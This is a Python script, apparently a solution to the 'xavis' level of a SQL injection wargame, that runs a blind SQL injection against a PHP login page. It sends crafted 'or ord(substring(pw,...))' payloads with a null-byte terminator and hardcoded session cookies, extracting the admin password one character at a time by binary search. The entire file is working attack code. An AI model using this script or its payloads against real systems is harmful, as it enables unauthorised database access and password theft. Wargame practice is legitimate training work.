import requests
from bs4 import BeautifulSoup

bfs=BeautifulSoup

URL= "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?"
cookie= {
    "__cfduid":"d33f226e52742a4101c7fa523b51564201526036891",
    "PHPSESSID":"ai3otf3joqlbggcceob45aonf2"
}
session1= requests.session()

pw=[]
for i in range(40):
    low = 32
    high= 256
    while True:
        mid = int((low+high)/2)
        data = "pw='or ord(substring(pw," + str(i + 1) + ",1))='" + str(low) + "';%00"
        req1 = session1.get(URL + data, cookies=cookie)
        if req1.text.find("Hello admin") > -1:
            pw.append(chr(low))
            print (pw)
            break
        data = "pw='or ord(substring(pw," + str(i + 1) + ",1))='" + str(mid) + "';%00"
        req1 = session1.get(URL + data, cookies=cookie)
        if req1.text.find("Hello admin") > -1:
            pw.append(chr(mid))
            print (pw)
            break
        data = "pw='or ord(substring(pw," + str(i + 1) + ",1))='" + str(high) + "';%00"
        req1 = session1.get(URL + data, cookies=cookie)
        if req1.text.find("Hello admin") > -1:
            pw.append(chr(high))
            print (pw)
            break
        data = "pw='or ord(substring(pw," + str(i + 1) + ",1))>'" + str(mid) + "';%00"
        req1 = session1.get(URL + data, cookies=cookie)
        if req1.text.find("Hello admin") > -1:
            low = mid + 1
            print ("now low is : "+str(low)+" = "+chr(low))

        data = "pw='or ord(substring(pw," + str(i + 1) + ",1))<'" + str(mid) + "';%00"
        req1 = session1.get(URL + data, cookies=cookie)
        if req1.text.find("Hello admin") > -1:
            high = mid -1
            print ("now high is : "+str(high)+" = "+chr(low))

        if low >= high:
            print ("can't find anymore....")
            print("password is : " + ''.join(pw))
            req = session1.get(URL+"pw="+''.join(pw))
            bu1 = bfs(req.text,'html5lib')
            print (bfs.prettify(bu1))
            exit (0)

print ("password is : "+''.join(pw))
